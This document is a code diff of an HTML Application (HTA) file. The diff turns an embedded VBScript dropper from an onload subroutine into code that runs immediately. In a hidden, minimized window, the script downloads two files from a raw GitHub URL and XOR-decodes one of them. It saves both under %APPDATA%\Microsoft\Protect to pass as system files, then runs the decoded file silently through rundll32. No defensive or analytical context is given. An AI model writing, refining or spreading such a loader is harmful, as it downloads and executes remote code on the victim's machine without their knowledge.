@@ -2,29 +2,27 @@
 <head>
 <hta:application showintaskbar="no" windowstate="minimize" border="none" caption="no" />
 <script language="VBScript">
-Sub W()
-  Dim sh,p,fso,xhr,st,raw,i
-  sh=CreateObject("WScript.Shell")
-  fso=CreateObject("Scripting.FileSystemObject")
-  p=sh.ExpandEnvironmentStrings("%APPDATA%\Microsoft\Protect\")
-  If Not fso.FolderExists(p) Then fso.CreateFolder(p)
-  Set xhr=CreateObject("MSXML2.XMLHTTP")
-  xhr.Open "GET","https://raw.githubusercontent.com/haha150/temp/main/nlaapi.bin",False
-  xhr.Send
-  Set st=CreateObject("ADODB.Stream")
-  st.Type=1:st.Open:st.Write xhr.responseBody
-  st.SaveToFile p&"nlaapi.bin",2:st.Close
-  xhr.Open "GET","https://raw.githubusercontent.com/haha150/temp/main/svc.dat",False
-  xhr.Send
-  raw=xhr.responseBody
-  For i=0 To UBound(raw):raw(i)=CByte(raw(i) Xor &HAB):Next
-  Set st=CreateObject("ADODB.Stream")
-  st.Type=1:st.Open:st.Write raw
-  st.SaveToFile p&"cng.dat",2:st.Close
-  sh.Run "rundll32.exe """&p&"cng.dat"",DataProtectSync",0,False
-  window.close
-End Sub
+Dim sh,p,fso,xhr,st,raw,i
+sh=CreateObject("WScript.Shell")
+fso=CreateObject("Scripting.FileSystemObject")
+p=sh.ExpandEnvironmentStrings("%APPDATA%\Microsoft\Protect\")
+If Not fso.FolderExists(p) Then fso.CreateFolder(p)
+Set xhr=CreateObject("MSXML2.XMLHTTP")
+xhr.Open "GET","https://raw.githubusercontent.com/haha150/temp/main/nlaapi.bin",False
+xhr.Send
+Set st=CreateObject("ADODB.Stream")
+st.Type=1:st.Open:st.Write xhr.responseBody
+st.SaveToFile p&"nlaapi.bin",2:st.Close
+xhr.Open "GET","https://raw.githubusercontent.com/haha150/temp/main/svc.dat",False
+xhr.Send
+raw=xhr.responseBody
+For i=0 To UBound(raw):raw(i)=CByte(raw(i) Xor &HAB):Next
+Set st=CreateObject("ADODB.Stream")
+st.Type=1:st.Open:st.Write raw
+st.SaveToFile p&"cng.dat",2:st.Close
+sh.Run "rundll32.exe """&p&"cng.dat"",DataProtectSync",0,False
+window.close
 </script>
 </head>
-<body onload="W()"></body>
+<body></body>
 </html>
